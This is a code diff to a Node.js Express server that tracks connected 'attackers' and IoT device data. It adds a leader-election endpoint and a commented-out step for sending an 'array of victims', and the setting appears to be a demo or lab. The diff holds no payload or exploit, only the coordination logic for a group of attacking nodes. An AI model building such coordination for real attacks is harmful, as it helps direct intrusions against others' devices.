@@ -13,6 +13,7 @@ app.use(bodyParser.json()); // support json encoded bodies
 app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies
 
 var connectedAttackers = 0;
+var leader = "";
 
 // Callback function when a HTTP POST method is requested, in the path '/iot-device'
 // Converts iot-device received data to a format understood by the web client
@@ -78,6 +79,17 @@ app.post("/attacker", function(req, res) {
 	console.log(attackersData);
 });
 
+app.post("/leader", function(req, res) {
+	if (leader === "") {
+		leader = req.body.leader;
+		console.log("The leader is: " + leader);
+		//Send array of victims
+		//res.send(ARRAY);
+	} else {
+		res.send("LEADER");
+	}
+});
+
 // Callback function when a 'connection' socket message is received
 // When a client connection is established
 io.on('connection', function(socket){
@@ -102,6 +114,7 @@ var attackersData = {}; // JSON containing the data of the attackers, time, ip a
 }*/
 
 function startElection() {
+	leader = "";
 	for (var key in attackersData) {
 		request.post({
 		  headers: {"content-type" : "text/plain"},
